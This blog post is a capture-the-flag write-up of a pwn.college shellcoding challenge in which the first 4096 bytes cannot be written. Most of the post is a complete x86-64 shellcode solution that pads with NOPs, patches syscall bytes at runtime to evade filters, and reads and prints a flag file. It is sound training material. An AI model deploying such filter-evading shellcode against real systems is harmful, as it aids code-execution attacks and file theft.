+++
title = 'No Write Permissions in Shellcode Begin'
date = 2023-09-22T14:50:16-04:00
description = "In this post, I will explain how I bypassed no-write permissions in a simple shellcoding challenge"
draft = false
+++
A while ago i was solving this challenge from [pwn.college](https://pwn.college) in the `shellcoding` module, it's a pretty fun challenge to solve, where you need to think outside-of-the-box (a little).

This challenge remove write permissions in the first 4096 bytes of our `shellcode`, therefore we need to put 4096 bytes of garbage before we start the `shellcode`.

This sounds hard but luckily assembly makes it very easy for us to achieve this.

Here's a program i used to solve the challenge, note that it's exactly like the challenge i have shown at [[Writing Shellcode without Syscalls]], but this time the first 4096 bytes of the `shellcode` aren't written.
```nasm
.global _start
_start:
.intel_syntax noprefix
    .rept 4096
    nop
    .endr

    # prepare syscall
    mov byte ptr[rip+label], 0x0f
    mov byte ptr[rip+label+1], 0x05
    lea r9, [rip+label]

    # clear registers
    xor rbx, rbx
    xor rdx, rdx
    xor rsi, rsi
    xor rdi, rdi
    xor r10, r10

    # open flag file
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rax, 2
    call r9

label:
    .word 0x0000

    xor r9, r9
    # prepare next syscall
    mov byte ptr[rip+label2], 0x0f
    mov byte ptr[rip+label2+1], 0x05
    lea r9, [rip+label2]

    xor rsi, rsi
    xor r10, r10
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx
    # sendfile
    mov rdi,1
    mov rsi, rax
    mov r10, 100
    mov rax, 40
    call r9
label2:
    .word 0x0000

    xor r9, r9
    # prepare syscall
    mov byte ptr[rip+label3], 0x0f
    mov byte ptr[rip+label3+1], 0x05
    lea r9, [rip+label3]
    # exit
    xor rsi, rsi
    xor r10, r10
    xor rax, rax
    xor rdi, rdi
    mov rax, 60
    mov rdi, 5
    call r9

label3:
    .word 0x0000
```

We used the `.rept <value>` instruction and the `.endr` instruction which ends the repeat, basically like a loop and everything in-between will be repeated in the assembled program.

For example, the following code would write 4096 nops in our `shellcode`, resulting in a very long `shellcode` but effectively bypassing the required filters.
```nasm
.rept 4096
nop
.endr
```


